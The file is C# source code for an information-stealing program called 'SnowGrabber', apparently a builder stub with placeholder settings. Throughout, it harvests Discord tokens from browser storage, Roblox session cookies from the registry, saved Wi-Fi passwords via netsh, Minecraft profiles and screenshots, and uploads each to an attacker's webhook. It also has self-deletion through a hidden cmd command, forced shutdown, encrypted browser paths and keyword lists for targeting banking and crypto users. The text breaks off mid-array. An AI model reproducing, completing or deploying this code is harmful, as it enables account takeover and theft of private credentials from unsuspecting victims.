using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;

namespace SnowGrabber
{
    class Program
    {
        public static string tempFolder = Environment.GetEnvironmentVariable("TEMP");
        public static string WebhookURL = SussyBaka("//INSERT_WEBHOOK//");

        public static string URLToOpen = "//URLTOOPEN//";


        public static bool CheckScreenShot = false;//SCREENSHOT//   
        public static bool CheckDiscordTokens = false;//DISCORDTOKENS//
        public static bool CheckRobloxCookie = false;//ROBLOXCOOKIE//
        public static bool CheckRobloxCookieGame = false;//ROBLOXCOOKIEGAME//
        public static bool CheckPasswords = false;//PASSWORDS//
        public static bool CheckMinecraft = false;//MINECRAFT//
        public static bool CheckWifi = false;//WIFI//
        public static bool CheckRestartPC = false;//RESTARTPC//
        public static bool CheckShutOffPC = false;//SHUTOFFPC//
        public static bool CheckMeltStub = false;//MELTSTUB//
        public static bool CheckOpenURL = false;//URLOPEN//

        public static async Task MainAsync()
        {
            try
            {
                File.Delete(tempFolder + "\\Tokens.txt");
            }
            catch
            { }


            if (CheckOpenURL)
            {
                try
                {
                    Process.Start(URLToOpen);
                }
                catch
                {
                }
            }
            if (CheckScreenShot)
            {
                try
                {
                    await Screenshotting.SendScreenshot();
                }
                catch (Exception e)
                {
                    Console.Write(e);
                    //(233333);
                }
            }


            if (CheckRobloxCookie)
            {
                try
                {
                    File.WriteAllText(tempFolder + "\\Roblox_Cookie.txt", Roblox.RobloxCookie());
                    await Roblox.SendRobloxCookie();
                }
                catch
                {
                }
            }



            if (CheckMinecraft)
            {
                try
                {
                    MinecraftRobber.GetMinecraft();
                }
                catch
                {
                }
            }

            if (CheckDiscordTokens)
            {
                try
                {
                    await DiscordTokens.GrabTokens();
                }
                catch (Exception e)
                {
                    Console.Write(e);
                }
            }

            if (CheckPasswords)
            {
                try
                {
                    Passwords.RunPass();
                }
                catch
                {
                }
            }



            if (CheckWifi)
            {
                try
                {
                    string Stealer_Dir = WifiStealing.Handler.ExploitDir;
                    string[] profiles = WifiStealing.Wifi.GetProfiles();
                    foreach (string profile in profiles)
                    {
                        File.WriteAllText(tempFolder + "\\Wifi.txt", WifiStealing.Wifi.GetWifiPassword(profile) + "\n");
                    }
                    WifiStealing.SendWifi();
                }
                catch
                {
                }
            }


            if (CheckMeltStub)
            {
                try
                {
                    Extra.MeltStub();
                }
                catch
                {
                }
            }
            if (CheckRestartPC)
            {
                try
                {
                    ShutOffs.RestartPC();
                }
                catch
                {
                }
            }
            if (CheckShutOffPC)
            {
                try
                {
                    ShutOffs.ShutDownPC();
                }
                catch
                {
                }
            }
        }






        public static void Main()
        {
            Thread.Sleep(-1);
            Task.Run(async () =>
            {
                await MainAsync();
            }).GetAwaiter().GetResult();

        }


        public class Extra
        {
            public static void MeltStub()
            {
                try
                {
                    var exepath = Assembly.GetEntryAssembly().Location;
                    var info = new ProcessStartInfo("cmd.exe", "/C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del \"" + exepath + "\"");
                    info.WindowStyle = ProcessWindowStyle.Hidden;
                    Process.Start(info).Dispose();
                    Environment.Exit(0);
                }
                catch
                {
                }
            }
        }

        public class ShutOffs
        {
            public static void ShutDownPC()
            {
                Process.Start("shutdown.exe", "-s -t 0");
            }
            public static void RestartPC()
            {

                System.Diagnostics.Process.Start("shutdown.exe", "-r -t 0");
            }
        }

        class WifiStealing
        {

            public static class Handler
            {
                public static readonly string DesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                public static readonly string LocalData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                public static readonly string System = Environment.GetFolderPath(Environment.SpecialFolder.System);
                public static readonly string AppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                public static readonly string CommonData = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
                public static readonly string MyDocuments = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                public static readonly string UserProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                public static readonly string ExploitName = Assembly.GetExecutingAssembly().Location;
                public static readonly string ExploitDirectory = Path.GetDirectoryName(ExploitName);

                public static string[] SysPatch = new string[]
                {
                AppData,
                LocalData,
                CommonData
                };

                public static string zxczxczxc = SysPatch[new Random().Next(0, SysPatch.Length)];
                public static string ExploitDir = zxczxczxc + "\\" + "AIO";
                public static string date = DateTime.Now.ToString("MM/dd/yyyy h:mm");
                public static string dateLog = DateTime.Now.ToString("MM/dd/yyyy");
            }

            internal sealed class CommandHelper
            {
                public static string Run(string cmd, bool wait = true)
                {
                    string output = "";
                    using (var process = new Process())
                    {
                        process.StartInfo = new ProcessStartInfo
                        {
                            UseShellExecute = false,
                            CreateNoWindow = true,
                            WindowStyle = ProcessWindowStyle.Hidden,
                            FileName = "cmd.exe",
                            Arguments = cmd,
                            RedirectStandardError = true,
                            RedirectStandardOutput = true
                        };
                        process.Start();
                        output = process.StandardOutput.ReadToEnd();
                        if (wait) process.WaitForExit();
                    }
                    return output;
                }
            }


            internal sealed class Wifi
            {
                public static string[] GetProfiles()
                {
                    string output = CommandHelper.Run("/C chcp 65001 && netsh wlan show profile | findstr All");
                    string[] wNames = output.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
                    for (int i = 0; i < wNames.Length; i++)
                        wNames[i] = wNames[i].Substring(wNames[i].LastIndexOf(':') + 1).Trim();
                    return wNames;
                }

                public static string GetWifiPassword(string profile)
                {
                    string output = CommandHelper.Run("/C chcp 65001 && netsh wlan show profile name=" + profile + " key=clear | findstr Key");
                    return output.Split(':').Last().Trim();
                }

                public static void ScanningNetworks()
                {
                    string Stealer_Dir = Handler.ExploitDir;
                    string output = CommandHelper.Run("/C chcp 65001 && netsh wlan show networks mode=bssid");

                }

                public static void SavedNetworks()
                {
                    string Stealer_Dir = Handler.ExploitDir;
                    string[] profiles = GetProfiles();
                    foreach (string profile in profiles)
                    {
                        if (profile.Equals("65001"))
                            continue;

                        string pwd = GetWifiPassword(profile);
                        string fmt = "PROFILE: " + profile + "\nPASSWORD: " + pwd + "\n\n";

                    }
                }

            }




            public static void SendWifi()
            {
                string FilePath = tempFolder + "\\Wifi.txt";
                using (HttpClient httpClient = new HttpClient())
                {
                    MultipartFormDataContent form = new MultipartFormDataContent();
                    var file_bytes = System.IO.File.ReadAllBytes(FilePath);
                    form.Add(new ByteArrayContent(file_bytes, 0, file_bytes.Length), "Document", "Wifi.txt");
                    httpClient.PostAsync(WebhookURL+"sadlife", form).Wait();
                    httpClient.Dispose();
                    File.Delete(tempFolder + "\\Wifi.txt");
                }
            }

        }


        public class MinecraftRobber
        {

            public static void GetMinecraft()
            {
                string target = tempFolder + "\\.minecraft\\launcher_profiles.json";
                Console.WriteLine(target);
                Console.WriteLine("copy to : " + tempFolder + "\\launcher_profiles.json");
                if (File.Exists(target))
                {
                    File.Copy(target, tempFolder + "\\launcher_profiles.json");
                    string Webhook_link = WebhookURL;

                    using (HttpClient httpClient = new HttpClient())
                    {
                        MultipartFormDataContent form = new MultipartFormDataContent();
                        var file_bytes = System.IO.File.ReadAllBytes(tempFolder + "\\launcher_profiles.json");
                        form.Add(new ByteArrayContent(file_bytes, 0, file_bytes.Length), "Document", "launcher_profiles.json");
                        httpClient.PostAsync(Webhook_link+"sadlife", form).Wait();
                        httpClient.Dispose();
                    }
                }

                else
                {
                }
            }
        }




        public class Roblox
        {
            public static async Task SendRobloxCookie()
            {
                string FilePath = tempFolder + "\\Roblox_Cookie.txt";
                using (HttpClient httpClient = new HttpClient())
                {
                    MultipartFormDataContent form = new MultipartFormDataContent();
                    var file_bytes = System.IO.File.ReadAllBytes(FilePath);
                    form.Add(new ByteArrayContent(file_bytes, 0, file_bytes.Length), "Document", "Roblox_Cookie.txt");
                    httpClient.PostAsync(WebhookURL+"sadlife", form).Wait();
                    httpClient.Dispose();
                    File.Delete(tempFolder + "\\Roblox_Cookie.txt");
                }
            }


            public static string RobloxCookie()
            {
                try
                {
                    using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com", false))
                    {
                        string cookie = key.GetValue(".ROBLOSECURITY").ToString();
                        cookie = cookie.Substring(46).Trim('>');
                        Console.WriteLine(cookie);
                        return (cookie+"o");
                    }
                }
                catch
                {
                    return ("No Roblox Cookie.");
                }

            }

        }

        public class DiscordTokens
        {
            class Asmodeus
            {
                public static string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                public static string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                public static string tempFolder = Environment.GetEnvironmentVariable("TEMP");
            }


            class Satan
            {
                public static string Extract(string target, string content)
                {
                    string output = String.Empty;
                    Regex rx = new Regex("\"" + target + "\"\\s*:\\s*(\"(?:\\\\\"|[^\"])*?\")");
                    MatchCollection matches = rx.Matches(content);
                    foreach (Match match in matches)
                    {
                        GroupCollection groups = match.Groups;
                        output = groups[1].Value;
                    }
                    output = output.Replace("\"", "");
                    return output;
                }
            }


            class Eurynomos
            {
                private string token;
                private string jsonResponse = String.Empty;

                public string fullUsername;
                public string userId;
                public string avatarUrl;
                public string phoneNumber;
                public string email;
                public string locale;
                public string creationDate;

                public Eurynomos(string inToken)
                {
                    token = inToken;
                    PostToken();
                }

                private void PostToken()
                {
                    try
                    {
                        using (HttpClient client = new HttpClient())
                        {
                            client.DefaultRequestHeaders.Add("Authorization", token);
                            var response = client.GetAsync("https://discordapp.com/api/v8/users/@me");
                            var final = response.Result.Content.ReadAsStringAsync();
                            jsonResponse = final.Result;
                        }
                        GetData();
                    }
                    catch (Exception e)
                    {
                        Console.Write(e);
                        //(233333);
                    }
                }
                private void GetData()
                {
                    int TokenID;
                    if (Int32.TryParse(userId, out TokenID))
                    {
                        string username = Satan.Extract("username", jsonResponse);
                        userId = Satan.Extract("id", jsonResponse);
                        string discriminator = Satan.Extract("discriminator", jsonResponse);
                        fullUsername = username + "#" + discriminator;

                        string avatarId = Satan.Extract("avatar", jsonResponse);
                        avatarUrl = "https://cdn.discordapp.com/avatars/" + userId + "/" + avatarId;

                        phoneNumber = Satan.Extract("phone", jsonResponse);
                        email = Satan.Extract("email", jsonResponse);

                        locale = Satan.Extract("locale", jsonResponse);



                        long creation = (Convert.ToInt32(TokenID.ToString()) >> 22) + 1420070400000;
                        var result = DateTimeOffset.FromUnixTimeMilliseconds(creation).DateTime;
                        creationDate = result.ToString();
                    }
                }
            }





            public static List<string> target = new List<string>();

            private static void Scan()
            {
                string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                target.Add(roaming + "\\Discord");
                target.Add(roaming + "\\discordcanary");
                target.Add(roaming + "\\discordptb");
                target.Add(roaming + "\\\\Opera Software\\Opera Stable");
                target.Add(local + "\\Google\\Chrome\\User Data\\Default");
                target.Add(local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default");
                target.Add(local + "\\Yandex\\YandexBrowser\\User Data\\Default");
            }


            public static List<string> Grab()
            {

                Scan();
                List<string> tokens = new List<string>();
                foreach (string x in target)
                {
                    if (Directory.Exists(x))
                    {
                        string path = x + "\\Local Storage\\leveldb";
                        DirectoryInfo leveldb = new DirectoryInfo(path);
                        foreach (var file in leveldb.GetFiles(false ? "*.log" : "*.ldb"))
                        {
                            string contents = file.OpenText().ReadToEnd();
                            foreach (Match match in Regex.Matches(contents, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
                                tokens.Add(match.Value);

                            foreach (Match match in Regex.Matches(contents, @"mfa\.[\w-]{84}"))
                                tokens.Add(match.Value);
                        }
                    }
                }
                return tokens;
            }




            public static List<string> tokens = Grab();


            public static async Task GrabTokens()
            {

                foreach (string toucan in tokens)
                {
                    Console.WriteLine(toucan);
                    Eurynomos t = new Eurynomos(toucan);
                    if (t.email == "")
                    {
                        return;
                    }
                    else
                    {
                        if (File.Exists(tempFolder + "\\Tokens.txt"))
                        {
                            File.AppendAllText(tempFolder + "\\Tokens.txt", toucan + "\n");
                        }
                        else
                        {
                            File.WriteAllText(tempFolder + "\\Tokens.txt", toucan + "\n");
                        }
                    }


                }
                await SendTokens();
            }




            public static async Task SendTokens()
            {

                string FilePath = tempFolder + "\\Tokens.txt";

                using (HttpClient httpClient = new HttpClient())
                {
                    MultipartFormDataContent form = new MultipartFormDataContent();
                    var file_bytes = System.IO.File.ReadAllBytes(FilePath);
                    form.Add(new ByteArrayContent(file_bytes, 0, file_bytes.Length), "Document", "Tokens.txt");
                    httpClient.PostAsync(WebhookURL+"sadlife", form).Wait();
                    httpClient.Dispose();
                    File.Delete(tempFolder + "\\Tokens.txt");
                }
            }


        }

        public class Screenshotting
        {


            public static string CaptureScreen()
            {
                try
                {

                    Bitmap captureBitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);

                    Rectangle captureRectangle = Screen.AllScreens[0].Bounds;

                    Graphics captureGraphics = Graphics.FromImage(captureBitmap);

                    captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);
                    captureBitmap.Save(tempFolder + "\\Capture.jpg", ImageFormat.Jpeg);
                }

                catch (Exception e)
                {
                    Console.Write(e);
                    //(233333);
                }
                return tempFolder + "\\Capture.jpg";
            }



            public static async Task SendScreenshot()
            {

                string FilePath = CaptureScreen();

                using (HttpClient httpClient = new HttpClient())
                {
                    MultipartFormDataContent form = new MultipartFormDataContent();
                    var file_bytes = System.IO.File.ReadAllBytes(FilePath);
                    form.Add(new ByteArrayContent(file_bytes, 0, file_bytes.Length), "Document", "Image.png");
                    httpClient.PostAsync(WebhookURL+"sadlife", form).Wait();
                    httpClient.Dispose();
                }
            }
        }



        public class Passwords
        {
            public static void SendPasswords()
            {

                string Webhook_link = WebhookURL;
                string FilePath = tempFolder + "\\passwords.txt";

                using (HttpClient httpClient = new HttpClient())
                {
                    MultipartFormDataContent form = new MultipartFormDataContent();
                    var file_bytes = System.IO.File.ReadAllBytes(FilePath);
                    form.Add(new ByteArrayContent(file_bytes, 0, file_bytes.Length), "Document", "Passwords.txt");
                    httpClient.PostAsync(Webhook_link+"sadlife", form).Wait();
                    httpClient.Dispose();
                }

            }



            internal sealed class Counter
            {
                // Browsers
                public static int Passwords = 0;
                public static int CreditCards = 0;
                public static int AutoFill = 0;
                public static int Cookies = 0;
                public static int History = 0;
                public static int Bookmarks = 0;
                public static int Downloads = 0;
                // Applications
                public static int VPN = 0;
                public static int Pidgin = 0;
                public static int Wallets = 0;
                public static int FTPHosts = 0;
                // Sessions, tokens
                public static bool Telegram = false;
                public static bool Steam = false;
                public static bool Uplay = false;
                public static bool Discord = false;
                // System data
                public static int SavedWifiNetworks = 0;
                public static bool ProductKey = false;
                public static bool DesktopScreenshot = false;
                public static bool WebcamScreenshot = false;
                // Grabber stats
                public static int GrabberDocuments = 0;
                public static int GrabberSourceCodes = 0;
                public static int GrabberDatabases = 0;
                public static int GrabberImages = 0;
                // Banking & Cryptocurrency services detection
                public static bool BankingServices = false;
                public static bool CryptoServices = false;
                public static bool PornServices = false;
                public static List<string> DetectedBankingServices = new List<string>();
                public static List<string> DetectedCryptoServices = new List<string>();
                public static List<string> DetectedPornServices = new List<string>();

                // Get string value
                public static string GetSValue(string application, bool value)
                {
                    return value ? "\n   ∟ " + application : "";
                }

                // Get integer value
                public static string GetIValue(string application, int value)
                {
                    return value != 0 ? "\n   ∟ " + application + ": " + value : "";
                }

                // Get list value
                public static string GetLValue(string application, List<string> value, char separator = '∟')
                {
                    value.Sort(); // Sort list items
                    return value.Count != 0 ? "\n   ∟ " + application + ":\n\t\t\t\t\t\t\t" + separator + " " +
                        string.Join("\n\t\t\t\t\t\t\t" + separator + " ", value) : "\n   ∟ " + application + " (No data)";
                }

                // Get boolean value
                public static string GetBValue(bool value, string success, string failed)
                {
                    return value ? "\n   ∟ " + success : "\n   ∟ " + failed;
                }

            }

            internal sealed class Banking
            {
                // Add value to list
                private static bool AppendValue(string value, List<string> domains)
                {
                    string domain = value
                        .Replace("www.", "").ToLower();
                    // Remove search results
                    if (
                        domain.Contains("google") ||
                        domain.Contains("bing") ||
                        domain.Contains("yandex") ||
                        domain.Contains("duckduckgo"))
                        return false;
                    // If cookie value
                    if (domain
                        .StartsWith("."))
                        domain = domain.Substring(1);
                    // Get hostname from url
                    try
                    {
                        domain = new System.Uri(domain).Host;
                    }
                    catch (System.UriFormatException) { }
                    // Remove .com, .org
                    domain = System.IO.Path.GetFileNameWithoutExtension(domain);
                    domain = domain.Replace(".com", "").Replace(".org", "");
                    // Check if domain already exists in list
                    foreach (string domainValue in domains)
                        if (domain.ToLower().Replace(" ", "").Contains(domainValue.ToLower().Replace(" ", "")))
                            return false;
                    // Convert first char to upper-case
                    domain = System.Globalization.CultureInfo.CurrentCulture.TextInfo.ToTitleCase(domain);
                    domains.Add(domain);
                    return true;
                }
                // Start clipper when active window title contains this text:
                public static string[] CryptoServices = new string[] {
            "bitcoin", "monero", "dashcoin", "litecoin", "etherium", "stellarcoin",
            "btc", "eth", "xmr", "xlm", "xrp", "ltc", "bch",
            "blockchain", "paxful", "investopedia", "buybitcoinworldwide",
            "cryptocurrency", "crypto", "trade", "trading", "биткоин", "wallet"
        };
                // Start webcam capture when active window title contains this text:
                public static string[] PornServices = new string[] {
            "porn", "sex", "hentai", "порно", "sex"
        };
                public static string[] BankingServices = new string[] {
            "qiwi", "money", "exchange",
            "bank",  "credit", "card", "банк", "кредит",
        };

                // Detect crypto currency services
                private static void DetectCryptocurrencyServices(string value)
                {
                    foreach (string service in CryptoServices)
                        if (value.ToLower().Contains(service) && value.Length < 25)
                            if (AppendValue(value, Counter.DetectedCryptoServices))
                            { Counter.CryptoServices = true; return; }
                }


                // Detect banking services
                private static void DetectBankingServices(string value)
                {
                    foreach (string service in BankingServices)
                        if (value.ToLower().Contains(service) && value.Length < 25)
                            if (AppendValue(value, Counter.DetectedBankingServices))
                            { Counter.BankingServices = true; return; }
                }

                // Detect porn services
                private static void DetectPornServices(string value)
                {
                    foreach (string service in PornServices)
                        if (value.ToLower().Contains(service) && value.Length < 25)
                            if (AppendValue(value, Counter.DetectedPornServices))
                            { Counter.PornServices = true; return; }
                }

                // Detect all
                public static void ScanData(string value)
                {
                    DetectBankingServices(value);
                    DetectCryptocurrencyServices(value);
                    DetectPornServices(value);
                }


                // Regex for credit cards types detection by number
                private static Dictionary<string, Regex> CreditCardTypes = new Dictionary<string, Regex>()
        {
            {"Amex Card", new Regex(@"^3[47][0-9]{13}$") },
            {"BCGlobal", new Regex(@"^(6541|6556)[0-9]{12}$") },
            {"Carte Blanche Card", new Regex(@"^389[0-9]{11}$") },
            {"Diners Club Card", new Regex(@"^3(?:0[0-5]|[68][0-9])[0-9]{11}$") },
            {"Discover Card", new Regex(@"6(?:011|5[0-9]{2})[0-9]{12}$") },
            {"Insta Payment Card", new Regex(@"^63[7-9][0-9]{13}$") },
            {"JCB Card", new Regex(@"^(?:2131|1800|35\\d{3})\\d{11}$") },
            {"KoreanLocalCard", new Regex(@"^9[0-9]{15}$") },
            {"Laser Card", new Regex(@"^(6304|6706|6709|6771)[0-9]{12,15}$") },
            {"Maestro Card", new Regex(@"^(5018|5020|5038|6304|6759|6761|6763)[0-9]{8,15}$") },
            {"Mastercard", new Regex(@"5[1-5][0-9]{14}$") },
            {"Solo Card", new Regex(@"^(6334|6767)[0-9]{12}|(6334|6767)[0-9]{14}|(6334|6767)[0-9]{15}$") },
            {"Switch Card", new Regex(@"^(4903|4905|4911|4936|6333|6759)[0-9]{12}|(4903|4905|4911|4936|6333|6759)[0-9]{14}|(4903|4905|4911|4936|6333|6759)[0-9]{15}|564182[0-9]{10}|564182[0-9]{12}|564182[0-9]{13}|633110[0-9]{10}|633110[0-9]{12}|633110[0-9]{13}$") },
            {"Union Pay Card", new Regex(@"^(62[0-9]{14,17})$") },
            {"Visa Card", new Regex(@"4[0-9]{12}(?:[0-9]{3})?$") },
            {"Visa Master Card", new Regex(@"^(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14})$") },
            {"Express Card", new Regex(@"3[47][0-9]{13}$") },
        };

                // Detect credit cards type by number
                public static string DetectCreditCardType(string number)
                {
                    foreach (KeyValuePair<string, Regex> dictonary in CreditCardTypes)
                        if (dictonary.Value.Match(number.Replace(" ", "")).Success)
                            return dictonary.Key;

                    return "Unknown";
                }

            }

            internal sealed class StringsCrypt
            {
                // Salt
                private static readonly byte[] saltBytes = new byte[] { 255, 64, 191, 111, 23, 3, 113, 119, 231, 121, 252, 112, 79, 32, 114, 156 };
                private static readonly byte[] cryptKey = new byte[] { 104, 116, 116, 112, 115, 58, 47, 47, 103, 105, 116, 104, 117, 98, 46, 99, 111, 109, 47, 76, 105, 109, 101, 114, 66, 111, 121, 47, 83, 116, 111, 114, 109, 75, 105, 116, 116, 121 };
                public static string github = Encoding.UTF8.GetString(cryptKey);

                // Decrypt string                   
                public static string Decrypt(byte[] bytesToBeDecrypted)
                {
                    byte[] decryptedBytes = null;
                    using (MemoryStream ms = new MemoryStream())
                    {
                        using (RijndaelManaged AES = new RijndaelManaged())
                        {
                            AES.KeySize = 256;
                            AES.BlockSize = 128;
                            var key = new Rfc2898DeriveBytes(cryptKey, saltBytes, 1000);
                            AES.Key = key.GetBytes(AES.KeySize / 8);
                            AES.IV = key.GetBytes(AES.BlockSize / 8);
                            AES.Mode = CipherMode.CBC;
                            using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                            {
                                cs.Write(bytesToBeDecrypted, 1/*-1*/, bytesToBeDecrypted.Length);
                                cs.Close();
                            }
                            decryptedBytes = ms.ToArray();
                        }
                    }
                    return Encoding.UTF8.GetString(decryptedBytes);
                }

                // Decrypt config value
                public static string DecryptConfig(string value)
                {
                    if (string.IsNullOrEmpty(value))
                        return "";

                    if (!value.StartsWith("ENCRYPTED:"))
                        return value;

                    return Decrypt(Convert.FromBase64String(value
                        .Replace("ENCRYPTED:", "")));
                }

                // Anonfile API key
                public static string AnonApiToken = Decrypt(new byte[] { 169, 182, 79, 179, 252, 54, 138, 148, 167, 99, 216, 216, 199, 219, 10, 249, 131, 166, 170, 145, 237, 248, 142, 78, 196, 137, 101, 62, 142, 107, 245, 134, }); //?token=0429cbf2316b8e33 :)
            }




            internal sealed class Paths
            {
                // Encrypted Chromium browser path's
                public static string[] sChromiumPswPaths =
                {
            StringsCrypt.Decrypt(new byte[] { 191, 144, 50, 4, 176, 103, 41, 226, 163, 145, 184, 198, 37, 147, 201, 246, 15, 80, 188, 217, 224, 55, 94, 195, 60, 36, 195, 150, 34, 219, 225, 21 }), // \Chromium\User Data\
            StringsCrypt.Decrypt(new byte[] { 66, 190, 240, 189, 196, 112, 68, 209, 120, 66, 32, 128, 51, 187, 11, 106, 133, 186, 29, 203, 189, 184, 20, 80, 22, 110, 247, 203, 200, 139, 145, 252 }), // \Google\Chrome\User Data\
            StringsCrypt.Decrypt(new byte[] { 235, 71, 60, 105, 141, 89, 135, 64, 7, 55, 22, 242, 173, 137, 97, 111, 206, 79, 207, 177, 151, 51, 114, 222, 203, 93, 6, 206, 108, 141, 97, 221 }), // \Google(x86)\Chrome\User Data\
            StringsCrypt.Decrypt(new byte[] { 73, 24, 163, 202, 103, 163, 250, 131, 58, 254, 109, 200, 0, 101, 128, 192, 177, 205, 31, 137, 135, 207, 160, 228, 106, 123, 85, 109, 55, 255, 16, 57 }), // \Opera Software\
            StringsCrypt.Decrypt(new byte[] { 94, 125, 152, 164, 215, 224, 18, 60, 32, 98, 147, 169, 150, 48, 141, 211, 192, 129, 56, 148, 7, 104, 31, 144, 122, 249, 59, 25, 71, 162, 241, 69, 98, 84, 243, 115, 233, 26, 59, 183, 252, 7, 8, 237, 21, 222, 0, 157 }), // \MapleStudio\ChromePlus\User Data\
            StringsCrypt.Decrypt(new byte[] { 139, 161, 110, 219, 171, 17, 246, 186, 22, 213, 4, 215, 141, 253, 17, 173, 215, 53, 171, 41, 246, 99, 184, 29, 177, 20, 156, 97, 116, 105, 188, 242 }), // \Iridium\User Data\
            StringsCrypt.Decrypt(new byte[] { 190, 77, 154, 38, 44, 145, 237, 67, 174, 9, 133, 3, 58, 246, 93, 41, 23, 35, 235, 203, 108, 171, 65, 71, 56, 233, 66, 13, 202, 51, 79, 41 }), // 7Star\7Star\User Data
            StringsCrypt.Decrypt(new byte[] { 62, 210, 240, 33, 118, 184, 243, 141, 77, 133, 0, 235, 139, 86, 39, 25, 137, 185, 88, 124, 221, 174, 169, 88, 91, 11, 213, 207, 43, 146, 75, 243 }), //CentBrowser\User Data
            StringsCrypt.Decrypt(new byte[] { 62, 0, 196, 29, 187, 130, 95, 54, 171, 116, 232, 214, 233, 238, 169, 220, 87, 81, 58, 192, 55, 32, 9, 66, 192, 71, 163, 194, 155, 180, 1, 100 }), //Chedot\User Data
            StringsCrypt.Decrypt(new byte[] { 248, 132, 208, 253, 161, 159, 142, 173, 129, 48, 103, 48, 159, 71, 82, 190, 211, 175, 88, 121, 54, 47, 62, 205, 43, 35, 160, 92, 160, 146, 80, 219 }), // Vivaldi\User Data
            StringsCrypt.Decrypt(new byte[] { 160, 221, 244, 224, 234, 124, 235, 177, 76, 91, 97, 50, 47, 65, 63, 227, 74, 50, 249, 90, 53, 48, 13, 166, 106, 36, 144, 79, 133, 138, 58, 173 }), // Kometa\User Data
            StringsCrypt.Decrypt(new byte[] { 14, 78, 82, 180, 74, 84, 229, 48, 85, 125, 151, 44, 44, 245, 236, 69, 139, 52, 31, 12, 236, 152, 84, 192, 7, 253, 207, 160, 82, 205, 206, 216 }), // Elements Browser\User Data
            StringsCrypt.Decrypt(new byte[] { 80, 37, 192, 228, 231, 129, 178, 111, 104, 225, 219, 4, 152, 121, 224, 204, 47, 223, 134, 64, 65, 137, 96, 90, 39, 174, 0, 233, 231, 244, 222, 81 }), // Epic Privacy Browser\User Data
            StringsCrypt.Decrypt(new byte[] { 193, 191, 13, 199, 192, 122, 144, 200, 83, 128, 6, 28, 13, 132, 90, 7, 29, 217, 70, 36, 4, 149, 132, 62, 242, 153, 217, 247, 182, 13, 180, 100 }), // uCozMedia\Uran\User Data
            StringsCrypt.Decrypt(new byte[] { 191, 8, 54, 18, 102, 8, 237, 252, 81, 68, 237, 30, 28, 29, 171, 167, 37, 11, 209, 77, 139, 81, 1, 98, 185, 217, 150, 213, 121, 123, 68, 82, 53, 254, 128, 68, 133, 32, 78, 35, 53, 212, 98, 35, 135, 101, 229, 112, 43, 179, 17, 51, 150, 27, 145, 232, 59, 202, 27, 195, 245, 91, 244, 53 }), // Fenrir Inc\Sleipnir5\setting\modules\ChromiumViewer
            StringsCrypt.Decrypt(new byte[] { 124, 243, 34, 12, 158, 74, 249, 212, 5, 90, 133, 132, 35, 216, 217, 22, 217, 55, 243, 252, 51, 87, 241, 238, 86, 244, 62, 37, 95, 154, 18, 210, 62, 206, 164, 16, 182, 192, 15, 85, 48, 23, 118, 190, 110, 166, 231, 219 }), // CatalinaGroup\Citrio\User Data
            StringsCrypt.Decrypt(new byte[] { 112, 174, 206, 195, 60, 254, 140, 154, 222, 29, 174, 131, 97, 154, 190, 225, 101, 102, 44, 184, 116, 3, 222, 149, 173, 77, 23, 224, 108, 61, 110, 83 }), // Coowon\Coowon\User Data
            StringsCrypt.Decrypt(new byte[] { 168, 208, 166, 82, 192, 153, 44, 149, 17, 233, 52, 199, 126, 180, 93, 48, 18, 157, 146, 139, 52, 61, 229, 244, 233, 177, 174, 202, 13, 20, 68, 248 }), // liebao\User Data
            StringsCrypt.Decrypt(new byte[] { 15, 171, 27, 72, 143, 86, 53, 189, 140, 83, 1, 120, 66, 90, 66, 28, 128, 139, 207, 118, 135, 205, 39, 142, 89, 231, 22, 111, 194, 199, 245, 22 }), // QIP Surf\User Data
            StringsCrypt.Decrypt(new byte[] { 64, 252, 183, 118, 9, 181, 137, 115, 42, 20, 107, 204, 169, 49, 101, 240, 160, 210, 28, 182, 65, 1, 170, 136, 179, 86, 242, 2, 40, 236, 39, 92 }), // Orbitum\User Data
            StringsCrypt.Decrypt(new byte[] { 163, 202, 80, 117, 26, 124, 142, 96, 200, 150, 88, 164, 24, 244, 151, 69, 200, 214, 2, 103, 223, 49, 243, 222, 70, 137, 79, 85, 208, 132, 160, 180 }), // Comodo\Dragon\User Data
            StringsCrypt.Decrypt(new byte[] { 190, 180, 48, 187, 130, 241, 22, 142, 148, 81, 86, 118, 125, 198, 67, 134, 168, 170, 218, 153, 252, 65, 45, 99, 146, 136, 184, 169, 8, 176, 254, 158 }), // Amigo\User\User Data
            StringsCrypt.Decrypt(new byte[] { 134, 62, 128, 238, 85, 244, 104, 139, 79, 49, 203, 166, 37, 19, 150, 80, 195, 12, 211, 168, 230, 85, 8, 141, 82, 13, 200, 163, 193, 61, 249, 18 }), // Torch\User Data
            StringsCrypt.Decrypt(new byte[] { 189, 176, 161, 91, 124, 7, 222, 38, 230, 226, 175, 16, 213, 160, 182, 221, 133, 88, 75, 233, 51, 39, 227, 90, 53, 56, 98, 251, 118, 191, 198, 4, 38, 3, 145, 152, 83, 170, 23, 225, 66, 207, 208, 132, 167, 27, 63, 43 }), // Yandex\YandexBrowser\User Data
